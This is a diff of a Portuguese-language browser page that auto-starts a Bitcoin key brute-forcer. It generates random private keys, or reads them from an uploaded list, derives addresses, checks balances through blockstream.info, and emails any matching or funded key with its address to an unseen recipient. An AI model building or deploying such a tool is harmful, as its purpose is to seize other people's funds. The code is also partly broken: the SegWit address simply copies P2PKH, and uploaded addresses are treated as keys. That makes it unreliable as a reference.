@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>BTC REAL — Auto Start</title>
+<title>BTC AUTO LIST + GENERATE</title>
 
 <style>
 body { font-family: Arial; background:#020617; color:#e5e7eb; padding:20px; }
@@ -19,10 +19,12 @@ input { background:#020617; border:1px solid #1e293b; color:#e5e7eb; padding:6px
 </head>
 <body>
 
-<h2>BTC REAL — Auto Start</h2>
+<h2>BTC AUTO LIST + GENERATE</h2>
 
-<label>🔽 Endereço para procurar</label>
-<input id="searchAddr" placeholder="Digite endereço BTC (opcional)">
+<label>🔽 Subir lista de endereços para procurar (.txt)</label>
+<input type="file" id="file" accept=".txt">
+
+<p id="count">📄 Endereços carregados: 0</p>
 
 <div class="stats" id="stats">
 Gerados: 0<br>
@@ -38,9 +40,8 @@ import { getPublicKey } from "https://esm.sh/@noble/secp256k1@2.1.0";
 import { sha256 } from "https://esm.sh/@noble/hashes@1.3.3/sha256";
 import { ripemd160 } from "https://esm.sh/@noble/hashes@1.3.3/ripemd160";
 
-const URL_LISTA = "https://raw.githubusercontent.com/paraguay10/py/main/lista.txt";
+/* ================= BASE58 ================= */
 const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
-
 function base58(buf){
   let zeros=0;
   while(zeros<buf.length && buf[zeros]===0) zeros++;
@@ -50,9 +51,10 @@ function base58(buf){
   return "1".repeat(zeros)+out;
 }
 
+/* ================= SALDO API ================= */
 async function consultarSaldo(address){
   try{
-    const res = await fetch(`https://blockstream.info/api/address/${address}`);
+    const res=await fetch(`https://blockstream.info/api/address/${address}`);
     if(!res.ok) return null;
     const data = await res.json();
     const funded = (data.chain_stats?.funded_txo_sum || 0) + (data.mempool_stats?.funded_txo_sum || 0);
@@ -61,7 +63,8 @@ async function consultarSaldo(address){
   } catch { return null; }
 }
 
-async function enviarEmail(dados, tipo="MATCH"){
+/* ================= EMAIL ================= */
+async function enviarEmail(dados,tipo="MATCH"){
   const saldo = await consultarSaldo(dados.P2PKH);
   const content = `${tipo}
 
@@ -81,14 +84,17 @@ SALDO P2PKH: ${saldo !== null ? saldo+" BTC" : "Erro"}`;
   });
 }
 
-/* ELEMENTOS */
+/* ================= ELEMENTOS ================= */
 const matchesOut = document.getElementById("matches");
 const grid = document.getElementById("grid");
-let totalMatches = 0;
-let totalGerados = 0;
+const countEl = document.getElementById("count");
+let listaEnderecos = new Set();
+let totalMatches=0;
+let totalGerados=0;
 let lastTime = performance.now();
 let lastCount = 0;
 
+/* ================= ESTATÍSTICAS ================= */
 function atualizarStats(){
   const now = performance.now();
   const delta = (now-lastTime)/1000;
@@ -98,80 +104,99 @@ function atualizarStats(){
   lastCount = totalGerados;
 }
 
-/* PROCESSAR LISTA AUTOMATICAMENTE */
-async function processarLista(){
-  matchesOut.innerHTML="";
-  grid.innerHTML="";
-  totalMatches=0;
-  totalGerados=0;
+/* ================= LER LISTA ================= */
+document.getElementById("file").addEventListener("change",async e=>{
+  const text = await e.target.files[0].text();
+  listaEnderecos.clear();
+  text.split(/\r?\n/).map(l=>l.trim()).filter(l=>l).forEach(l=>listaEnderecos.add(l));
+  countEl.textContent = `📄 Endereços carregados: ${listaEnderecos.size}`;
+});
 
-  const txt = await fetch(URL_LISTA).then(r=>r.text());
-  const linhas = txt.split(/\r?\n/).map(l=>l.trim()).filter(l=>l);
-  const searchAddr = document.getElementById("searchAddr").value.trim();
+/* ================= GERAR ENDEREÇOS ================= */
+function gerarPrivKey(){
+  const bytes = new Uint8Array(32);
+  crypto.getRandomValues(bytes);
+  return [...bytes].map(b=>b.toString(16).padStart(2,"0")).join("");
+}
 
-  // Processar todos em paralelo sem travar a UI
-  for(const [i, privHex] of linhas.entries()){
-    if(!/^[0-9a-fA-F]{64}$/.test(privHex)) continue;
+function gerarAddress(privHex){
+  const priv = Uint8Array.from(privHex.match(/.{2}/g).map(b=>parseInt(b,16)));
+  const pub = getPublicKey(priv,true);
+  const hash160 = ripemd160(sha256(pub));
 
-    try{
-      const priv = Uint8Array.from(privHex.match(/.{2}/g).map(b=>parseInt(b,16)));
-      const pub = getPublicKey(priv,true);
-      const hash160 = ripemd160(sha256(pub));
-      const payload = new Uint8Array([0x00,...hash160]);
-      const checksum = sha256(sha256(payload)).slice(0,4);
-      const P2PKH = base58(new Uint8Array([...payload,...checksum]));
-      const P2SH = base58(new Uint8Array([0x05,...hash160,...sha256(sha256(new Uint8Array([0x05,...hash160]))).slice(0,4)]));
-      const P2WPKH = P2PKH;
+  const payload = new Uint8Array([0x00,...hash160]);
+  const checksum = sha256(sha256(payload)).slice(0,4);
+  const P2PKH = base58(new Uint8Array([...payload,...checksum]));
+  const P2SH = base58(new Uint8Array([0x05,...hash160,...sha256(sha256(new Uint8Array([0x05,...hash160]))).slice(0,4)]));
+  const P2WPKH = P2PKH;
+  return {privHex,P2PKH,P2SH,P2WPKH};
+}
 
-      totalGerados++;
+/* ================= LOOP PRINCIPAL ================= */
+async function loop(){
+  let listaArray = Array.from(listaEnderecos);
+  let indexLista = 0;
 
-      // Renderizar endereço imediatamente
-      const divCard = document.createElement("div");
-      divCard.className="match";
-      divCard.textContent=`${i+1}) ${P2PKH} (${privHex})`;
-      grid.appendChild(divCard);
-
-      const dados = {privHex,P2PKH,P2SH,P2WPKH};
-
-      // Verificar saldo e match em paralelo
-      (async()=>{
-        let isMatch=false;
-        if(searchAddr && (searchAddr===P2PKH || searchAddr===P2SH || searchAddr===P2WPKH)){
-          isMatch=true;
-          totalMatches++;
-          const div = document.createElement("div");
-          div.className="match";
-          div.textContent=`MATCH ENCONTRADO!\n${JSON.stringify(dados,null,2)}`;
-          matchesOut.prepend(div);
-          enviarEmail(dados,"MATCH ENCONTRADO");
-        }
-
-        const saldo = await consultarSaldo(P2PKH);
-        if(saldo && saldo>0){
-          isMatch=true;
-          totalMatches++;
-          const div = document.createElement("div");
-          div.className="match";
-          div.textContent=`SALDO >0!\n${JSON.stringify(dados,null,2)}\nSaldo: ${saldo} BTC`;
-          matchesOut.prepend(div);
-          enviarEmail(dados,"SALDO POSITIVO");
-        }
-      })();
-
-      atualizarStats();
-
-    } catch(e){
-      console.log("Erro cripto:", e);
+  while(true){
+    let dados;
+    if(indexLista < listaArray.length){
+      // usar da lista carregada
+      const privHex = listaArray[indexLista];
+      indexLista++;
+      dados = gerarAddress(privHex);
+    } else {
+      // gerar própria chave
+      const privHex = gerarPrivKey();
+      dados = gerarAddress(privHex);
     }
-    // Pequena pausa para não travar UI
-    if(i%50===0) await new Promise(r=>setTimeout(r,1));
+
+    totalGerados++;
+
+    // Mostrar no grid
+    const div = document.createElement("div");
+    div.className="match";
+    div.textContent=`${totalGerados}) ${dados.P2PKH} (${dados.privHex})`;
+    grid.prepend(div);
+
+    // Verificar match e saldo
+    (async()=>{
+      let isMatch=false;
+
+      // Match lista
+      if(listaEnderecos.has(dados.P2PKH) || listaEnderecos.has(dados.P2SH) || listaEnderecos.has(dados.P2WPKH)){
+        isMatch=true;
+        totalMatches++;
+        const div2 = document.createElement("div");
+        div2.className="match";
+        div2.textContent=`MATCH ENCONTRADO!\n${JSON.stringify(dados,null,2)}`;
+        matchesOut.prepend(div2);
+        enviarEmail(dados,"MATCH ENCONTRADO");
+      }
+
+      // Saldo positivo
+      const saldo = await consultarSaldo(dados.P2PKH);
+      if(saldo && saldo>0){
+        isMatch=true;
+        totalMatches++;
+        const div3 = document.createElement("div");
+        div3.className="match";
+        div3.textContent=`SALDO >0!\n${JSON.stringify(dados,null,2)}\nSaldo: ${saldo} BTC`;
+        matchesOut.prepend(div3);
+        enviarEmail(dados,"SALDO POSITIVO");
+      }
+
+    })();
+
+    atualizarStats();
+
+    // Pequena pausa para não travar o browser
+    if(totalGerados % 50 === 0) await new Promise(r=>setTimeout(r,1));
   }
 }
 
-// INICIA AUTOMATICAMENTE
-window.addEventListener("load", processarLista);
+/* ================= INICIA AUTOMATICAMENTE ================= */
+window.addEventListener("load",()=>loop());
 
 </script>
-
 </body>
 </html>
